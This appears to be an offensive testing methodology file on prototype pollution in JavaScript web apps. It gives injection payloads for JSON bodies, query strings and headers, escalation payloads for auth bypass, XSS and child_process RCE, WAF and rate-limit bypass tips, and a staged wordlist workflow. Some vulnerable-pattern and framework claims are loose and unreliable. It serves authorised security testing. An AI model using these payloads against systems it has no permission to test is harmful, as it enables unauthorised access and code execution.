---

name: web-08-prototype-pollution
sequence: web-08
category: injection
domain: web
description: "Prototype pollution testing: __proto__ injection via JSON body, query parameters, and merge/clone operations. Covers detection in Node.js apps, escalation to XSS, RCE, and auth bypass via polluting Object.prototype. Use when testing JavaScript-heavy web applications."
wordlist_ref: "wordlists/web/web-13-prototype-pollution/"
---

# Prototype Pollution — Offensive Testing Methodology

## Quick Workflow

1. Identify endpoints that merge/clone/assign user-controlled objects (JSON body, query params, headers)
2. Inject `__proto__` or `constructor.prototype` into the input — if Object.prototype gets modified, pollution confirmed
3. Escalate to XSS, RCE, or auth bypass by polluting properties consumed downstream (e.g., `isAdmin`, `shell` for child_process)

---

## Detection

### JSON Body Probes

```json
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
{"__proto__": {"isAdmin": true}}
{"__proto__": {"shell": "/bin/sh"}}
```

### Query Parameter Probes

```
?__proto__[polluted]=true
?__proto__[isAdmin]=true
?constructor[prototype][polluted]=true
```

### Header Injection

```
X-Pollute: __proto__.polluted=true
X-Forwarded-For: __proto__.polluted=true
```

---

## Escalation

### Auth Bypass

```json
{"__proto__": {"isAdmin": true, "role": "admin"}}
```

### RCE via child_process

```json
{"__proto__": {"shell": "/bin/sh", "argv0": "node -e 'require(\"child_process\").execSync(\"id\")'//"}}
```

### XSS via polluted attributes

```json
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
```

**Framework-specific XSS via pollution:**
- **jQuery**: `$.extend(true, {}, {"__proto__":{"innerHTML":"<svg onload=alert(1)>"}})` — if rendered via `.html()`
- **React**: pollute `innerHTML` on state objects → `dangerouslySetInnerHTML` equivalent
- **Angular**: pollute trusted values → `bypassSecurityTrustHtml` gets bypassed
- **Vue**: pollute `v-html` bindings → arbitrary HTML injection

### JSON Body Injection

```json
// POST body — merge or assign
POST /api/profile
{"name":"test","__proto__":{"isAdmin":true}}

// Nested object via JSON
POST /api/settings
{"theme":"dark","constructor":{"prototype":{"admin":true}}}
```

### Query String Injection

```
?__proto__[shell]=/bin/sh&__proto__[argv0]=node
?constructor[prototype][admin]=true
```

### Header Injection

```
X-Custom: __proto__.admin=true
X-Forwarded-For: __proto__.shell=/bin/sh
```

---

## Vulnerable Patterns

```javascript
// lodash merge
_.merge({}, userInput);
// Object.assign
Object.assign({}, userInput);
// jQuery.extend
$.extend(true, {}, userInput);
// Express body-parser
JSON.parse(body); // if nested __proto__
```

---

## Tools

- **Burp** with prototype pollution scanner extension
- **Custom Python/Node scripts** with `__proto__` payloads
- **PPScan** — prototype pollution scanner

---





## Hacker Mindset

**Look for the edge cases.** Vulnerabilities live in the gap between what the developer assumed and what the framework actually does. Test every boundary: empty values, nulls, arrays, negative numbers, Unicode, very long strings.

**Blind detection always needs OOB.** If you can't see the output, set up a callback. No OOB = no confirmation.

**Chaining turns low/med into critical.** A single path traversal is medium. Path traversal + log file + admin session = RCE. Always think about what comes next.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-13-prototype-pollution/`

**Files**:
- `wordlists/web/web-13-prototype-pollution/payloads/prototype_pollution/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

## References

- s1r1us.github.io/2020/08/24/prototype-pollution.html
- PortSwigger prototype pollution research
- CVE-2019-10744, CVE-2020-8203, CVE-2022-21824
